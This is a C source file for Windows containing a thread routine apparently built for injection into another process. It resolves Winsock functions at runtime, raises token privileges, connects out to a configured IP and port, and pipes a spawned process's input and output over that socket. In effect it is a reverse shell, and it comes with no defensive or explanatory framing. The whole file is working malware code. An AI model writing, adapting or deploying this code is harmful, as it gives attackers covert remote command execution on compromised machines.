#include "Connection.h"
#include "RemoteThreadRout.h"
#include <Windows.h>
#include "SysRunThread.h"

LPTHREAD_START_ROUTINE RemoteThreadRoutine(LPVOID lpParameter)
{
	WSADATA wsaData;
	REMOTE_THREAD_DATA* rtd;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HPCON hpc;
	LPVOID lpRemoteConsoleProcessHandle;
	HANDLE hReturnConsoleProcess, hPseudoCurrentProcess, hCurrentProcess, hInputThread, hOutputThread, hInputRead, hInputWrite, hOutputRead, hOutputWrite;
	HMODULE hWs2_32Dll;
	LPOPEN_PROCESS_TOKEN OpenProcessTokenF;
	LPADJUST_TOKEN_PRIVILEGES AdjustTokenPrivilegesF;
	DWORD timeout;
	SOCKET shell;
	struct sockaddr_in shell_addr;
	BOOL res;
	SIZE_T bytesRequired;
	DWORD exitCode = -1;
	int i;

	rtd = (REMOTE_THREAD_DATA*)lpParameter;

	// zero STARTUPINFOW, PROCESS_INFORMATION and SECURITY_ATTRIBUTES
	for (i = 0; i < sizeof(si); i++)
		((char*)&si)[i] = 0;
	for (i = 0; i < sizeof(pi); i++)
		((char*)&pi)[i] = 0;
	for (i = 0; i < sizeof(sa); i++)
		((char*)&sa)[i] = 0;

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	hPseudoCurrentProcess = rtd->GetCurrentProcess();
	res = rtd->ttd.OpenProcessToken(hPseudoCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &hCurrentProcess);
	if (res == FALSE)
		goto lFailed;
	res = rtd->ttd.AdjustTokenPrivileges(hCurrentProcess, FALSE, rtd->ttd.pTp, 0, NULL, NULL);
	if (res == FALSE)
		goto lFailed;

	res = rtd->CreatePipe(&hInputRead, &hInputWrite, &sa, 0);
	if (res == FALSE)
		goto lFailed;
	res = rtd->CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0);
	if (res == FALSE)
		goto lFailed;
	res = rtd->SetHandleInformation(hInputWrite, HANDLE_FLAG_INHERIT, 0);
	if (res == FALSE)
		goto lFailed;
	res = rtd->SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
	if (res == FALSE)
		goto lFailed;

	hWs2_32Dll = rtd->LoadLibraryW(rtd->ctd.lpWS2_32DllName);
	if (hWs2_32Dll == NULL)
		goto lFailed;

	rtd->ctd.WsaStartup = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.lpWSAStartupName);
	if (rtd->ctd.WsaStartup == NULL)
		goto lFailed;

	rtd->ctd.WsaSocketW = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.lpWSASocketWName);
	if (rtd->ctd.WsaSocketW == NULL)
		goto lFailed;

	rtd->ctd.WsaConnect = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.lpWSAConnectName);
	if (rtd->ctd.WsaConnect == NULL)
		goto lFailed;

	rtd->ctd.Select = rtd->GetProcAddress(hWs2_32Dll, rtd->ctd.selectName);
	if (rtd->ctd.Select == NULL)
		goto lFailed;

	rtd->ctd.WsaStartup(WINSOCK_VERSION, &wsaData);

	shell = rtd->ctd.WsaSocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (shell == INVALID_SOCKET)
		goto lFailed;

	shell_addr.sin_addr.s_addr = rtd->ctd.ipAddress.S_un.S_addr;
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_port = rtd->ctd.port;

	res = rtd->ctd.WsaConnect(shell, (struct sockaddr*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
	if (res == SOCKET_ERROR)
		goto lFailed;

	rtd->lpHandles.hInputReadPipe = shell;
	rtd->lpHandles.hInputWritePipe = hInputWrite;
	rtd->lpHandles.hOutputReadPipe = hOutputRead;
	rtd->lpHandles.hOutputWritePipe = shell;

	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = hInputRead;
	si.hStdOutput = hOutputWrite;
	si.hStdError = hOutputWrite;

	hInputThread = rtd->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rtd->RemoteInputThread, lpParameter, 0, NULL);
	if (hInputThread == NULL)
		goto lFailed;
	hOutputThread = rtd->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rtd->RemoteOutputThread, lpParameter, 0, NULL);
	if (hOutputThread == NULL)
		goto lFailed;

	rtd->hInputThread = hInputThread;
	rtd->hOutputThread = hOutputThread;

	res = rtd->CreateProcessW(
		NULL,
		rtd->lpCommandLine,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	if (res == FALSE)
		goto lFailed;

lSucceeded:
	rtd->SetEvent(rtd->hEventSuccess);
	rtd->CloseHandle(rtd->hEventSuccess);
	rtd->CloseHandle(rtd->hEventFail);
	rtd->WaitForSingleObject(pi.hProcess, INFINITE);
	rtd->TeminateThread(hInputThread, 0);
	rtd->TeminateThread(hOutputThread, 0);
	rtd->ExitThread(0);

lFailed:
	exitCode = rtd->GetLastError();
	rtd->SetEvent(rtd->hEventFail);
	rtd->CloseHandle(rtd->hEventSuccess);
	rtd->CloseHandle(rtd->hEventFail);
	rtd->ExitThread(exitCode);
}

int Label1() { return 1; }

LPTHREAD_START_ROUTINE RemoteInputThread(LPVOID lpParameter)
{
	REMOTE_THREAD_DATA* rtd;
	HANDLE hInputRead, hInputWrite;
	DWORD bytesRead;
	struct fd_set fds;
	struct timeval tv;
	char buffer[1024];
	int selectResult;
	int i;

	rtd = (REMOTE_THREAD_DATA*)lpParameter;

	hInputRead = rtd->lpHandles.hInputReadPipe;
	hInputWrite = rtd->lpHandles.hInputWritePipe;

	tv.tv_sec = 0;
	tv.tv_usec = 0;

	while (1)
	{
		rtd->Sleep(100);

		FD_ZERO(&fds);
		FD_SET(hInputRead, &fds);

		selectResult = rtd->ctd.Select(0, &fds, NULL, NULL, &tv);
		if (selectResult == 0)
			continue;

		rtd->ReadFile(hInputRead, buffer, 1024, &bytesRead, NULL);

		rtd->WriteFile(hInputWrite, buffer, bytesRead, NULL, NULL);
		for (i = 0; i < 1024; i++) // zero memory
			buffer[i] = 0;
	}
}

int Label2() { return 2; }

LPTHREAD_START_ROUTINE RemoteOutputThread(LPVOID lpParameter)
{
	REMOTE_THREAD_DATA* rtd;
	HANDLE hOutputRead, hOutputWrite;
	DWORD bytesRead;
	char buffer[2048];
	int i;

	rtd = (REMOTE_THREAD_DATA*)lpParameter;

	hOutputRead = rtd->lpHandles.hOutputReadPipe;
	hOutputWrite = rtd->lpHandles.hOutputWritePipe;

	while (1)
	{
		rtd->Sleep(20);
		rtd->ReadFile(hOutputRead, buffer, 2048, &bytesRead, NULL);
		if (bytesRead <= 0)
			continue;

		rtd->WriteFile(hOutputWrite, buffer, bytesRead, NULL, NULL);
		for (int i = 0; i < 2048; i++) // zero memory
			buffer[i] = 0;
	}
}

int Label3() { return 3; }